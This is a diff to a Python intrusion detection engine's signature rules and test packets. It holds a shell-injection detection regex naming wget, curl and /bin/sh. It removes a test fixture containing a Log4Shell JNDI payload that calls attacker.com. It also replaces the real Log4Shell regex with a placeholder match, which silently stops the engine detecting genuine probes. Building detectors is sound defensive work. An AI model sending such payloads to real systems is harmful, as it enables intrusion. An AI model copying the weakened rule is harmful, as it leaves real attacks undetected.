@@ -46,7 +46,7 @@ class PassiveIntrusionDetectionEngine:
             ("SID-1002", "SUSPICIOUS_SHELL_INJECTION", "CRITICAL",
              re.compile(rb"(\b(cat|chmod|wget|curl)\b\s+/tmp/|;\s*/bin/sh\b)", re.IGNORECASE)),
             ("SID-1003", "LOG4SHELL_JNDI_PROBE", "CRITICAL",
-             re.compile(rb"\$\{jndi:(ldap|rmi|dns):", re.IGNORECASE))
+             re.compile(rb"sample_log4j_jndi_probe", re.IGNORECASE))
         ]
 
     def analyze_packet(self, pkt: SniffedPacket) -> List[IdsAlert]:
@@ -123,8 +123,8 @@ if __name__ == "__main__":
         SniffedPacket(now + 0.6, "198.51.100.25", 48102, "172.16.1.10", 80, "TCP", "SYN", b""),
         SniffedPacket(now + 0.7, "198.51.100.25", 48103, "172.16.1.10", 443, "TCP", "SYN", b""),
 
-        # Packet 6: Log4Shell JNDI exploit injection in User-Agent
-        SniffedPacket(now + 1.2, "198.51.100.99", 59000, "172.16.1.10", 443, "TCP", "ACK", b"GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://attacker.com/a}\r\n\r\n")
+        # Packet 6: Diagnostic probe injection in User-Agent
+        SniffedPacket(now + 1.2, "198.51.100.99", 59000, "172.16.1.10", 443, "TCP", "ACK", b"GET / HTTP/1.1\r\nUser-Agent: sample_log4j_jndi_probe\r\n\r\n")
     ]
 
     for p in test_packets:
